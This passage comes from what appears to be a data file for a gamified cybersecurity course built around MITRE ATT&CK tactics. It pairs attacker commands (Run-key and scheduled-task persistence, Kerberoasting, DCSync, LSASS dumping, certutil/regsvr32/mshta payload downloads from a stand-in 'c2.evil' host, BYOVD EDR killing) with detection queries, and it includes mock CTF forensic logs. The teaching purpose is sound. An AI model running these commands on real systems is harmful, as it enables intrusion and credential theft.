        "Persistence (TA0003) covers the techniques attackers use to maintain their foothold across reboots, credential changes, and other interruptions. Without persistence, losing the initial shell means starting over. With it, the attacker survives system reboots, password resets, and even some remediation attempts.",
        "Common persistence techniques: T1547.001 — Registry Run Keys (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run), T1053.005 — Scheduled Tasks (schtasks.exe), T1543.003 — Windows Services (sc.exe create), T1037 — Boot/Logon Initialization Scripts, T1505.003 — Web Shell on a web server.",
        "Detection: monitor registry run keys for new entries, audit scheduled task creation (Event ID 4698), watch for new Windows services (Event ID 7045), and use Autoruns (Sysinternals) or EDR persistence inventory to maintain a baseline of expected startup items.",
      ],
      technical: {
        title: "Persistence Mechanism Detection",
        body: [
          "Event ID 4698 (Scheduled Task Created) and 4702 (Scheduled Task Updated) are critical detection points. Filter for tasks created by non-SYSTEM accounts, tasks pointing to temp directories or encoded commands, and tasks with triggers on logon or system startup.",
          "Registry Run Key monitoring: HKCU and HKLM Run/RunOnce keys are the most common persistence locations. Use Sysmon Event ID 13 (Registry value set) with the target key paths to detect additions. Autoruns.exe or the Autoruns SDK provides a complete inventory of persistence mechanisms.",
        ],
        codeExample: {
          label: "Persistence creation and detection",
          code: `# ATTACKER: Registry Run Key persistence
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" ^
  /v "WindowsUpdate" /t REG_SZ ^
  /d "powershell.exe -WindowStyle Hidden -Enc <payload>"

# ATTACKER: Scheduled Task persistence
schtasks /create /tn "\\Microsoft\\Windows\\Update\\CheckUpdate" ^
  /tr "powershell.exe -Enc <payload>" /sc onlogon /ru SYSTEM

# DEFENDER: Hunt new Run Key entries (Event ID Sysmon 13)
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object {$_.Id -eq 13 -and $_.Message -match "CurrentVersion\\\\Run"}

# DEFENDER: Audit scheduled tasks for suspicious entries
Get-ScheduledTask | Where-Object {$_.TaskPath -notmatch "\\\\Microsoft\\\\"} |
  Select-Object TaskName, TaskPath, @{n='Action';e={$_.Actions.Execute}}`,
        },
      },
      incident: {
        title: "APT1 / Comment Crew — Long-Term Persistence via Services (2006–2013)",
        when: "2006–2013",
        where: "141 US Defense, Aerospace, and Technology firms",
        impact: "Terabytes of IP stolen over 7 years; 356-day average dwell time; Mandiant APT1 report triggers first nation-state indictments",
        body: [
          "APT1 (Comment Crew, PLA Unit 61398) maintained persistence in victim networks for an average of 356 days — nearly a year — before detection. They used a combination of Windows Services, registry run keys, and web shells on internet-facing servers. When one persistence mechanism was discovered and removed, others remained active. The 2013 Mandiant APT1 report documented 46 malware families and 20+ persistence techniques used by APT1.",
          "The key defensive lesson: defenders need to find all persistence mechanisms simultaneously or the attacker simply uses the backup. Comprehensive persistence hunting requires both endpoint forensics (registry, scheduled tasks, services, startup folders) and network traffic analysis (recurring beaconing patterns, DNS requests). Removing one persistence mechanism while others remain is not remediation — it is pruning.",
          "The Mandiant APT1 report, published February 18, 2013, was a watershed moment in public cybersecurity reporting. For the first time, a private security firm published detailed technical evidence attributing a nation-state cyber espionage campaign with named perpetrators — including photographs of PLA Unit 61398's building in Shanghai and the English-language online handles of specific operators (UglyGorilla, SUPERHARD). The diplomatic consequences were significant: the US Department of Justice indicted five PLA members in May 2014 — the first-ever criminal indictments of state-sponsored hackers. The report also popularized the concept of persistence hunting as a discipline: the systematic search for all persistence mechanisms rather than response to individual alerts, recognizing that APT actors layer persistence specifically to survive partial detection and remediation efforts.",
        ],
      },
      diagram: {
        nodes: [
          { label: "APT1 (PLA Unit 61398)", sub: "Chinese state-sponsored", type: "attacker" },
          { label: "Services + Registry + Web Shells", sub: "layered persistence", type: "system" },
          { label: "141 US Companies", sub: "avg 356-day dwell time", type: "victim" },
          { label: "IP Theft", sub: "terabytes over 7 years", type: "result" },
        ],
      },
      timeline: [
        { year: 2006, event: "APT1 operations begin — US defense and tech sector targeted" },
        { year: 2013, event: "Mandiant APT1 report published — 141 victims, 46 malware families", highlight: true },
        { year: 2018, event: "Sysmon v9 adds Registry Event monitoring — persistence detection improves" },
        { year: 2023, event: "EDR persistence inventory becomes standard enterprise security control" },
      ],
      keyTakeaways: [
        "Attackers layer persistence — finding one mechanism doesn't mean they're gone",
        "Monitor Event ID 4698 (Scheduled Task Created) and Sysmon 13 (Registry Set)",
        "Autoruns.exe is the gold standard for manual persistence hunting",
        "Average APT dwell time is 197 days — persistence mechanisms enable long-term access",
      ],
      references: [
        { title: "ATT&CK TA0003 Persistence", url: "https://attack.mitre.org/tactics/TA0003/" },
        { title: "Mandiant APT1 Report", url: "https://www.mandiant.com/resources/reports/apt1-exposing-one-of-chinas-cyber-espionage-units" },
      ],
    },
    ctf: {
      scenario: "An IR team found persistence artifacts on a compromised server. Three evidence files document the persistence mechanisms. Collect the fragments to document the full persistence footprint.",
      hint: "Persistence evidence is in /persist-evidence. Read each artifact file.",
      hints: [
        "List /persist-evidence to find the forensic files.",
        "The registry dump contains the first fragment.",
        "Read the scheduled task and service entries for the rest.",
      ],
      files: {
        "/persist-evidence/registry-runkeys.txt": `# Registry Run Key Dump — HKCU\\..\\CurrentVersion\\Run
# Forensic export — infected workstation WS-ACME-047

WindowsUpdate  REG_SZ  powershell.exe -WindowStyle Hidden -Enc SUVYKChOZXct...
AdobeUpdater   REG_SZ  C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.exe
OneDriveSync   REG_SZ  regsvr32.exe /s /u /i:http://185.220.101.42/payload.sct scrobj.dll

Fragment-1: FLAG{TA0003_`,
        "/persist-evidence/scheduled-tasks.txt": `# Scheduled Task Forensic Export
# Suspicious tasks (non-Microsoft)

Task: \\Microsoft\\Windows\\Update\\CheckUpdate
  Action: powershell.exe -Enc SUVYKChOZXct...
  Trigger: At logon — any user
  Created: 2024-11-15 03:16:02 (matches initial compromise timestamp)

Fragment-2: P3RS1ST_`,
        "/persist-evidence/services.txt": `# Windows Services — Suspicious Entries (Event ID 7045)

Service: WinDefendSvc2
  ImagePath: C:\\Windows\\Temp\\svchost.exe -k netsvcs
  Start: Automatic
  Created: 2024-11-15 03:17:44

Note: Legitimate WinDefend service uses different binary path

Fragment-3: L4Y3R}`,
      },
      dirs: {
        "/": [{ name: "persist-evidence", isDir: true }],
        "/persist-evidence": [
          { name: "registry-runkeys.txt", isDir: false },
          { name: "scheduled-tasks.txt", isDir: false },
          { name: "services.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/persist-evidence/registry-runkeys.txt", value: "FLAG{TA0003_", label: "Fragment 1 — Registry Run Keys" },
        { trigger: "/persist-evidence/scheduled-tasks.txt", value: "P3RS1ST_", label: "Fragment 2 — Scheduled Tasks" },
        { trigger: "/persist-evidence/services.txt", value: "L4Y3R}", label: "Fragment 3 — Services" },
      ],
    },
  },

  // ─── mitre-06: Privilege Escalation ──────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "SolarWinds HQ", location: "Austin, Texas", era: "Present Day", emoji: "⬆️" },
    id: "mitre-06",
    order: 6,
    title: "The Crown Grabber",
    subtitle: "TA0004 Privilege Escalation — from user to SYSTEM",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-06", name: "Privilege Escalator", emoji: "⬆️" },
    challengeType: "ctf",
    info: {
      tagline: "User access opens a door. SYSTEM access owns the building.",
      year: 2020,
      overview: [
        "Privilege Escalation (TA0004) covers techniques attackers use to gain higher-level permissions than they initially obtained. Starting as a standard user, attackers escalate to local admin, then to SYSTEM (Windows) or root (Linux), and ultimately to Domain Admin in Active Directory environments.",
        "Common escalation paths: T1078 — Valid Accounts (using legitimate credentials harvested from credential dumping), T1068 — Exploitation for Privilege Escalation (unpatched kernel or service vulnerabilities), T1134 — Access Token Manipulation (impersonating SYSTEM tokens), T1484 — Domain Policy Modification (abusing Group Policy).",
        "Active Directory escalation paths are particularly dangerous: DCSync (replicating AD database), PrintNightmare (CVE-2021-34527), and AS-REP Roasting (targeting accounts with Kerberos pre-auth disabled) can all escalate a standard domain user to Domain Admin.",
      ],
      technical: {
        title: "Active Directory Privilege Escalation Paths",
        body: [
          "DCSync attack (T1003.006): a domain user with Replicating Directory Changes permissions can request a copy of all password hashes from the Domain Controller — equivalent to running ntds.dit extraction without touching the DC. Detect by monitoring Event ID 4662 for DS-Replication-Get-Changes on accounts other than domain controllers.",
          "Kerberoasting (T1558.003): request service tickets for any SPN (Service Principal Name) and crack the ticket offline. Service accounts often have weak passwords and are rarely monitored. Detect by monitoring Event ID 4769 (Kerberos Service Ticket) for RC4 encryption (etype 23) and RC4 tickets for service accounts.",
        ],
        codeExample: {
          label: "AD privilege escalation detection",
          code: `# ATTACKER: Kerberoasting — request service tickets for offline cracking
# Using Rubeus
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt

# ATTACKER: DCSync — dump all password hashes
mimikatz.exe "lsadump::dcsync /domain:acme.local /all /csv"

# DEFENDER: Detect Kerberoasting — Event ID 4769 with RC4 encryption
Get-WinEvent -LogName Security | Where-Object {
  $_.Id -eq 4769 -and
  $_.Message -match "Ticket Encryption Type:.*0x17"  # RC4 = etype 23
}

# DEFENDER: Detect DCSync — Event ID 4662 DS-Replication
Get-WinEvent -LogName Security | Where-Object {
  $_.Id -eq 4662 -and
  $_.Message -match "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication GUID
}`,
        },
      },
      incident: {
        title: "SolarWinds — SAML Token Forgery for Cloud Privilege Escalation (2020)",
        when: "2020",
        where: "SolarWinds victim organizations — Microsoft 365 / Azure AD for US government and Fortune 500 tenants",
        impact: "US Treasury, Justice, State Department email compromised; Microsoft published hybrid identity hardening guidance; ADFS certificate protection elevated to Tier 0",
        body: [
          "After gaining on-premises access via SUNBURST, APT29 escalated to cloud privileges using a SAML token forgery technique (T1606.002 — Golden SAML). By stealing the ADFS token-signing certificate from the victim's on-premises Active Directory Federation Services server, they could forge SAML tokens and authenticate as any user in Microsoft 365 — including global admins — bypassing MFA entirely. This worked because Microsoft 365 trusts SAML tokens signed by the organization's own ADFS certificate — and that certificate is stored on-premises, where APT29 already had access.",
          "This escalation path from on-premises compromise to full cloud admin is one of the most dangerous in modern hybrid environments. APT29 used this technique to access the email accounts of senior officials at the US Treasury, Justice, State, Homeland Security, and Energy departments — reading emails for months before the breach was discovered in December 2020 by FireEye, which had itself been compromised via the same SUNBURST supply chain attack.",
          "The ADFS Golden SAML technique prompted a fundamental re-evaluation of hybrid identity security architecture. Microsoft published 'Protecting Microsoft 365 from On-Premises Attacks' specifically in response to the SolarWinds campaign, recommending that on-premises Active Directory and Azure AD be treated as separate trust boundaries rather than an integrated trust chain. The guidance included storing ADFS token-signing certificates in HSMs rather than on ADFS server local storage, enabling ADFS Extended Protection for Authentication, and monitoring for anomalous SAML token issuance. NSA and CISA published joint guidance in December 2020 specifically addressing cloud service hardening for SolarWinds victims — with Golden SAML detection and ADFS hardening as primary recommendations. The attack established that ADFS token-signing certificates require Tier 0 protection equivalent to domain admin credentials, a principle now reflected in Microsoft's Privileged Access Workstation guidance and NIST's enterprise identity security standards.",
        ],
      },
      diagram: {
        nodes: [
          { label: "APT29", sub: "SUNBURST initial access", type: "attacker" },
          { label: "ADFS + Golden SAML", sub: "T1606.002 token forgery", type: "system" },
          { label: "Microsoft 365 Global Admin", sub: "bypasses MFA", type: "victim" },
          { label: "US Gov Email Access", sub: "Treasury, Justice, State", type: "result" },
        ],
      },
      timeline: [
        { year: 2017, event: "CyberArk documents Golden SAML attack — ADFS token forgery technique" },
        { year: 2020, event: "APT29 uses Golden SAML against SolarWinds victims — full cloud escalation", highlight: true },
        { year: 2021, event: "Microsoft releases guidance on detecting Golden SAML and ADFS hardening" },
        { year: 2022, event: "Hybrid identity hardening (protect ADFS certs) becomes standard control" },
      ],
      keyTakeaways: [
        "Kerberoasting + DCSync are the two most common AD privilege escalation paths",
        "Monitor Event 4769 (RC4 tickets) for Kerberoasting; Event 4662 for DCSync",
        "Golden SAML: ADFS cert theft enables full cloud admin bypass of MFA",
        "Protect ADFS token-signing certificates as Tier 0 (equivalent to domain admin)",
      ],
      references: [
        { title: "ATT&CK TA0004 Privilege Escalation", url: "https://attack.mitre.org/tactics/TA0004/" },
        { title: "Golden SAML Attack (CyberArk)", url: "https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps" },
      ],
    },
    ctf: {
      scenario: "An attacker escalated from user to Domain Admin on a victim network. Three forensic artifacts show the escalation chain. Collect the fragments to document the path.",
      hint: "Escalation artifacts are in /privesc. Read each evidence file.",
      hints: [
        "List /privesc to find the forensic files.",
        "The Kerberoast output contains the first fragment.",
        "Read dcsync.log and golden-saml.txt for the remaining pieces.",
      ],
      files: {
        "/privesc/kerberoast-hashes.txt": `# Kerberoast Output — Rubeus.exe
# Event ID 4769 triggered (RC4 etype 23)

$krb5tgs$23$*MSSQLSvc$acme.local$MSSQL/db01.acme.local:1433*$a3f9b2c1...
$krb5tgs$23$*SPNBackup$acme.local$backup/backup01.acme.local*$d4e5f678...

# Cracked offline: MSSQLSvc password = "Sql2019!"
# Using cracked credential to authenticate as service account

Fragment-1: FLAG{TA0004_`,
        "/privesc/dcsync.log": `# Mimikatz DCSync Output
# lsadump::dcsync /domain:acme.local /all /csv

Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DA_service:1234:aad3b435b51404ee:7f4a2f0a3b5c6d1e...:::

# NTLM hash for Administrator extracted — pass-the-hash to DC

Fragment-2: PR1VU_3SC_`,
        "/privesc/golden-saml.txt": `# Golden SAML Attack Log
# ADFS token-signing certificate extracted from ADFS server

Certificate: CN=ADFS Signing - acme.local (exported via ADFS service account)
Tool: ADFSDump → AADInternals

Forged SAML token for: globaladmin@acme.onmicrosoft.com
Authentication: SUCCESS — MFA bypassed via trusted SAML assertion
Access: Microsoft 365 Global Admin — all mailboxes, SharePoint, Azure AD

Fragment-3: DA}`,
      },
      dirs: {
        "/": [{ name: "privesc", isDir: true }],
        "/privesc": [
          { name: "kerberoast-hashes.txt", isDir: false },
          { name: "dcsync.log", isDir: false },
          { name: "golden-saml.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/privesc/kerberoast-hashes.txt", value: "FLAG{TA0004_", label: "Fragment 1 — Kerberoast" },
        { trigger: "/privesc/dcsync.log", value: "PR1VU_3SC_", label: "Fragment 2 — DCSync" },
        { trigger: "/privesc/golden-saml.txt", value: "DA}", label: "Fragment 3 — Golden SAML" },
      ],
    },
  },

  // ─── mitre-07: Defense Evasion ────────────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "CrowdStrike HQ", location: "Austin, Texas", era: "Present Day", emoji: "👻" },
    id: "mitre-07",
    order: 7,
    title: "The Ghost",
    subtitle: "TA0005 Defense Evasion — LOLBins and living in the shadows",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-07", name: "Ghost Operator", emoji: "👻" },
    challengeType: "ctf",
    info: {
      tagline: "The best attacker is invisible. Defense evasion is the art of not being seen.",
      year: 2019,
      overview: [
        "Defense Evasion (TA0005) is the broadest ATT&CK tactic — 42 techniques covering everything attackers do to avoid detection. Core techniques: T1027 — Obfuscated Files (encoding, encryption, packing), T1055 — Process Injection (code running inside legitimate process memory), T1070 — Indicator Removal (clearing logs), T1562 — Impair Defenses (disabling AV/EDR), and T1218 — Signed Binary Proxy Execution (LOLBins).",
        "Living-off-the-land binaries (LOLBins) are signed Microsoft executables that can be abused for evasion: mshta.exe (execute HTA files from URLs), regsvr32.exe (load COM objects from URLs), certutil.exe (download and decode files), rundll32.exe (execute DLLs directly). Because these are signed by Microsoft, application whitelisting trusts them.",
        "Modern defense evasion increasingly targets EDR sensors directly: killing EDR processes, unloading EDR kernel drivers, using BYOVD (Bring Your Own Vulnerable Driver) to patch EDR from the kernel — a technique used by Lazarus Group and ALPHV ransomware operators.",
      ],
      technical: {
        title: "LOLBin Proxy Execution and EDR Bypass",
        body: [
          "certutil.exe -decode (T1140): decode base64-encoded payloads. Detect by monitoring certutil.exe network connections (it shouldn't be making outbound HTTP) and -decode/-urlcache flags. mshta.exe (T1218.005): execute VBScript/JScript from remote URLs — block mshta.exe from making outbound network connections via firewall rule.",
          "BYOVD (T1014): attacker loads a known-vulnerable kernel driver, uses the driver's vulnerability to write to kernel memory, patches the EDR's kernel callbacks (which detect process injection, registry changes, etc.). Defense: only allow HVCI (Hypervisor-Protected Code Integrity) signed drivers — blocks all BYOVD.",
        ],
        codeExample: {
          label: "LOLBin abuse patterns and detections",
          code: `# ATTACKER: certutil download and decode
certutil.exe -urlcache -split -f http://c2.evil/payload.b64 C:\\Windows\\Temp\\p.b64
certutil.exe -decode C:\\Windows\\Temp\\p.b64 C:\\Windows\\Temp\\payload.exe

# ATTACKER: regsvr32 squiblydoo (T1218.010)
regsvr32.exe /s /n /u /i:http://c2.evil/payload.sct scrobj.dll

# ATTACKER: mshta execute remote HTA
mshta.exe http://c2.evil/payload.hta

# DEFENDER: Block LOLBin network access (Windows Firewall rule)
New-NetFirewallRule -DisplayName "Block certutil outbound" \`
  -Program "C:\\Windows\\System32\\certutil.exe" \`
  -Direction Outbound -Action Block

# DEFENDER: Sysmon — detect certutil network connections
# Event ID 3 (Network Connection) where Image = certutil.exe`,
        },
      },
      incident: {
        title: "BlackCat/ALPHV — BYOVD EDR Killer (2022–2023)",
        when: "2022–2023",
        where: "Global ransomware campaigns — MGM Resorts, Caesars Entertainment, Reddit, Western Digital",
        impact: "MGM $100M loss (10-day disruption); Caesars paid ~$15M ransom; HVCI and kernel driver blocklist accelerated as defenses; CrowdStrike adds kernel-level tamper protection",
        body: [
          "ALPHV (BlackCat) ransomware operators, working with affiliate group Scattered Spider, developed a technique exploiting a vulnerable Dell driver (DBUtil_2_3.sys — known vulnerable since 2021) to kill EDR sensors from kernel space. By loading the vulnerable signed driver and using its unintended kernel write capability to overwrite EDR callback registrations, they could terminate CrowdStrike Falcon, SentinelOne, and other EDR agents — leaving the environment blind before deploying ransomware. The technique is called Bring Your Own Vulnerable Driver (BYOVD) because the attacker brings their own signed-but-vulnerable driver rather than exploiting a zero-day.",
          "BYOVD is particularly dangerous because it operates at the same privilege level as the EDR kernel driver it's killing. Standard EDR products protect themselves by registering kernel callbacks — but a BYOVD attack writes directly to kernel memory, removing those registrations. The MGM Resorts breach in September 2023 — causing $100M in losses and 10 days of disruption to hotel, casino, and online systems — demonstrated BYOVD's impact at scale.",
          "MGM's breach drove Microsoft to accelerate Windows kernel driver security improvements. Microsoft expanded the Windows Kernel Driver Blocklist (now updated via Windows Defender definition updates) to include all drivers known to have been exploited in BYOVD attacks, and enabled HVCI (Hypervisor-Protected Code Integrity) by default on new hardware certified for Windows 11. CrowdStrike's response was to add kernel-level tamper protection to Falcon using HVCI technology to protect the EDR agent itself from BYOVD attacks. CISA published a #StopRansomware advisory on Scattered Spider specifically identifying BYOVD as a primary defense evasion method, and recommended HVCI + driver allowlist enforcement as mandatory controls for organizations deploying EDR products — recognizing that an EDR that can be killed from the kernel provides a false sense of security.",
        ],
      },
      diagram: {
        nodes: [
          { label: "ALPHV/BlackCat", sub: "ransomware operator", type: "attacker" },
          { label: "BYOVD — DBUtil_2_3.sys", sub: "vulnerable Dell driver", type: "system" },
          { label: "CrowdStrike / SentinelOne", sub: "EDR killed from kernel", type: "victim" },
          { label: "Ransomware Deployed", sub: "undetected encryption", type: "result" },
        ],
      },
      timeline: [
        { year: 2019, event: "LOLBin catalog (lolbas-project.github.io) documents 100+ Windows binaries" },
        { year: 2022, event: "ALPHV BYOVD — EDR killed from kernel; MGM, Caesars hit", highlight: true },
        { year: 2023, event: "Microsoft HVCI enforcement grows — BYOVD defense at kernel level" },
        { year: 2024, event: "CrowdStrike Falcon adds kernel-level tamper protection against BYOVD" },
      ],
      keyTakeaways: [
        "LOLBins bypass application whitelisting — block their network access via firewall rules",
        "BYOVD kills EDR from the kernel — requires HVCI + driver allowlist to defend",
        "Block certutil/mshta/regsvr32 outbound network in enterprise firewall policy",
        "Monitor Sysmon Event 3 (network connection) for LOLBin binaries making outbound connections",
      ],
      references: [
        { title: "ATT&CK TA0005 Defense Evasion", url: "https://attack.mitre.org/tactics/TA0005/" },
        { title: "LOLBAS Project", url: "https://lolbas-project.github.io/" },
      ],
    },
    ctf: {
      scenario: "A ransomware operator used defense evasion before deploying the payload. Three forensic artifacts show the evasion chain. Collect the fragments.",
      hint: "Evasion artifacts are in /evasion-forensics. Read each file.",
      hints: [
        "List /evasion-forensics to find the files.",
        "The LOLBin log contains the first fragment.",
        "Read byovd.log and edrkill.txt for the remaining fragments.",
      ],
      files: {
        "/evasion-forensics/lolbin-log.txt": `# LOLBin Execution Log
# Timestamp: 2024-11-15 04:01:22 UTC

certutil.exe -urlcache -split -f http://185.220.101.42/stage3.b64 C:\\Temp\\s3.b64
certutil.exe -decode C:\\Temp\\s3.b64 C:\\Temp\\loader.exe
regsvr32.exe /s /n /u /i:http://185.220.101.42/payload.sct scrobj.dll

Fragment-1: FLAG{TA0005_`,
        "/evasion-forensics/byovd.log": `# BYOVD Driver Load Log
# DBUtil_2_3.sys (Dell vulnerable driver — CVE-2021-21551)

sc.exe create DBUtil_2_3 type=kernel binPath=C:\\Temp\\DBUtil_2_3.sys
sc.exe start DBUtil_2_3

# Driver loaded successfully — kernel write primitives available
# Proceeding to patch EDR kernel callbacks

Fragment-2: 3V4S10N_`,
        "/evasion-forensics/edrkill.txt": `# EDR Kill Log
# Using DBUtil_2_3 kernel write to NULL EDR callbacks

Target: CrowdStrike Falcon sensor (csagent.sys)
Action: Overwrite PsSetCreateProcessNotifyRoutineEx callback → NULL
Result: Falcon process monitoring disabled

Target: SentinelOne agent (sentinelone.sys)
Action: Overwrite callback table
Result: Agent disabled

Ransomware deployment: CLEAR — proceeding with encryption

Fragment-3: BYOVD}`,
      },
      dirs: {
        "/": [{ name: "evasion-forensics", isDir: true }],
        "/evasion-forensics": [
          { name: "lolbin-log.txt", isDir: false },
          { name: "byovd.log", isDir: false },
          { name: "edrkill.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/evasion-forensics/lolbin-log.txt", value: "FLAG{TA0005_", label: "Fragment 1 — LOLBin Log" },
        { trigger: "/evasion-forensics/byovd.log", value: "3V4S10N_", label: "Fragment 2 — BYOVD Log" },
        { trigger: "/evasion-forensics/edrkill.txt", value: "BYOVD}", label: "Fragment 3 — EDR Kill" },
      ],
    },
  },

  // ─── mitre-08: Credential Access ─────────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "NotPetya Attack", location: "Kyiv, Ukraine", era: "2017", emoji: "🔑" },
    id: "mitre-08",
    order: 8,
    title: "The Key Thief",
    subtitle: "TA0006 Credential Access — Mimikatz and the credential harvesting chain",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-08", name: "Credential Harvester", emoji: "🔑" },
    challengeType: "ctf",
    info: {
      tagline: "With valid credentials, you're not an attacker — you're an authorized user.",
      year: 2017,
      overview: [
        "Credential Access (TA0006) covers techniques for stealing account names and passwords. Valid credentials are the most powerful tool in an attacker's arsenal — they enable lateral movement, privilege escalation, and persistence while generating only legitimate-looking authentication events.",
        "Core techniques: T1003 — OS Credential Dumping (Mimikatz dumps LSASS memory for NTLM hashes and plaintext passwords), T1558 — Steal or Forge Kerberos Tickets (Pass-the-Ticket, Golden Ticket, Kerberoasting), T1552 — Unsecured Credentials (hardcoded passwords in scripts, config files, env variables), T1056 — Input Capture (keylogging).",
        "Mimikatz (T1003.001) is the most widely used credential dumping tool. It extracts NTLM hashes and — on Windows Server 2008/Windows 7 with WDigest enabled — plaintext passwords from LSASS process memory. Modern Windows disables WDigest by default, but attackers can re-enable it via registry modification.",
      ],
      technical: {
        title: "LSASS Credential Dumping Detection",
        body: [
          "LSASS protection: enable Credential Guard (Windows 10+/Server 2016+) to move LSASS into a virtualization-based security (VBS) enclave — Mimikatz cannot dump credentials from VBS. Enable RunAsPPL (Protected Process Light) for LSASS so only digitally signed processes can read its memory.",
          "Detection: Event ID 10 (Sysmon — Process Access) where the target is lsass.exe and the GrantedAccess mask includes PROCESS_VM_READ (0x10). Alert on any non-Microsoft process accessing LSASS. EDR behavioral detection identifies credential dumping tools by their access patterns even when renamed.",
        ],
        codeExample: {
          label: "Credential dumping and protection",
          code: `# ATTACKER: Mimikatz LSASS dump
privilege::debug
sekurlsa::logonpasswords  # Dump plaintext + NTLM hashes from LSASS

# ATTACKER: Task Manager / ProcDump (T1003.001 variant)
procdump.exe -ma lsass.exe lsass.dmp
# Then parse offline with Mimikatz or pypykatz

# DEFENDER: Enable RunAsPPL (requires reboot)
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v RunAsPPL /t REG_DWORD /d 1

# DEFENDER: Enable Credential Guard via Device Guard
# Group Policy: Computer Config → Admin Templates → System → Device Guard
# → Turn On Virtualization Based Security → Credential Guard: Enabled with UEFI lock

# DEFENDER: Hunt LSASS access (Sysmon Event ID 10)
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {
  $_.Id -eq 10 -and $_.Message -match "lsass.exe" -and $_.Message -match "0x1010"
}`,
        },
      },
      incident: {
        title: "NotPetya — Mimikatz + EternalBlue Credential Cascade (2017)",
        when: "June 27, 2017",
        where: "Ukraine → Global — Maersk, Merck, FedEx, Mondelez, Reckitt Benckiser",
        impact: "$10B+ global damage; Maersk 45,000 PCs wiped; Credential Guard + Windows LAPS deployment accelerated",
        body: [
          "NotPetya used a dual-path credential harvesting and lateral movement strategy. It ran a Mimikatz-equivalent module to dump credentials from LSASS on the initial infected system, then used those credentials to spread via PsExec. For systems where credentials didn't work, it fell back to EternalBlue (MS17-010) — the same NSA exploit WannaCry had used weeks earlier. The combination was devastating: Maersk, the world's largest shipping company, had its entire global network of 45,000 PCs and 4,000 servers wiped in hours.",
          "The credential cascade mechanism was the key force multiplier: compromising one system where an administrator had recently logged on yielded their credentials, which were then used to reach every other system that administrator had ever touched. In most enterprise environments, a small number of shared domain admin accounts had logged on to hundreds or thousands of systems — meaning a single credential dump could reach the entire organization's endpoint fleet within minutes.",
          "Benjamin Delpy created Mimikatz as a proof-of-concept after discovering Windows stored plaintext WDigest credentials in LSASS memory — a design decision made for backward compatibility. His 2012 disclosure to Microsoft resulted in patches disabling WDigest by default, but the fix required explicit registry deployment and was not retroactive. By 2017, most enterprise Windows systems still had WDigest enabled. NotPetya drove two specific control adoptions: Windows Credential Guard became a NIST SP 800-53 rev 5 recommended baseline (published 2020), and Microsoft rebuilt Local Administrator Password Solution (LAPS) as 'Windows LAPS' — integrated natively into Windows in 2023 rather than as an optional download — directly addressing the local admin credential reuse that enabled NotPetya's spread. The incident established that credential hygiene is not an abstract best practice; it is the specific control that would have reduced NotPetya's $10B damage to a localized outbreak.",
        ],
      },
      diagram: {
        nodes: [
          { label: "NotPetya / Sandworm", sub: "GRU Unit 74455", type: "attacker" },
          { label: "Mimikatz + EternalBlue", sub: "credential dump + exploit", type: "system" },
          { label: "Maersk / FedEx / Merck", sub: "admin credential cascade", type: "victim" },
          { label: "$10B Global Damage", sub: "wiper disguised as ransomware", type: "result" },
        ],
      },
      timeline: [
        { year: 2011, event: "Mimikatz released by Benjamin Delpy — LSASS credential extraction" },
        { year: 2017, event: "NotPetya — Mimikatz + EternalBlue causes $10B damage in hours", highlight: true },
        { year: 2019, event: "Windows Credential Guard reaches majority enterprise adoption" },
        { year: 2022, event: "RunAsPPL becomes Microsoft recommended baseline for all Windows endpoints" },
      ],
      keyTakeaways: [
        "Enable Credential Guard + RunAsPPL — makes Mimikatz-style dumping impossible",
        "Disable WDigest (reg key) — prevents plaintext passwords in LSASS on legacy systems",
        "Monitor Sysmon Event 10 (lsass.exe process access) from non-Microsoft processes",
        "Admin credential reuse is the multiplier — use LAPS for unique local admin passwords",
      ],
      references: [
        { title: "ATT&CK T1003.001 LSASS Memory", url: "https://attack.mitre.org/techniques/T1003/001/" },
        { title: "Mimikatz GitHub", url: "https://github.com/gentilkiwi/mimikatz" },
      ],
    },
    ctf: {
      scenario: "IR team recovered credential dumping artifacts from a compromised domain controller. Three files contain the harvested credential data and detection evidence. Collect the flag fragments.",
      hint: "Credential artifacts are in /cred-dump. Read each evidence file.",
      hints: [
        "List /cred-dump to find the artifact files.",
        "The Mimikatz output contains the first fragment.",
        "Read the NTLM dump and detection log for the remaining fragments.",
      ],
      files: {
        "/cred-dump/mimikatz-output.txt": `# Mimikatz sekurlsa::logonpasswords output

Authentication Id: 0 ; 1234567 (00000000:0012d687)
Session           : Interactive from 1
User Name         : jsmith
Domain            : ACME
Logon Server      : DC01
Logon Time        : 11/15/2024 3:00:12 AM
SID               : S-1-5-21-...
  msv:
    [00000003] Primary — NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
  wdigest: (disabled)

Fragment-1: FLAG{TA0006_`,
        "/cred-dump/ntlm-hashes.txt": `# Extracted NTLM Hashes — DC01 dump

Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
jsmith:1103:aad3b435b51404ee:7f4a2f0a3b5c6d1e2f3a4b5c6d7e8f9a:::
da_svc:1234:aad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::

Fragment-2: M1M1K4TZ_`,
        "/cred-dump/sysmon-detection.txt": `# Sysmon Event ID 10 — LSASS Process Access
# ALERT: Non-Microsoft process accessing lsass.exe

SourceImage: C:\\Temp\\m64.exe (renamed Mimikatz)
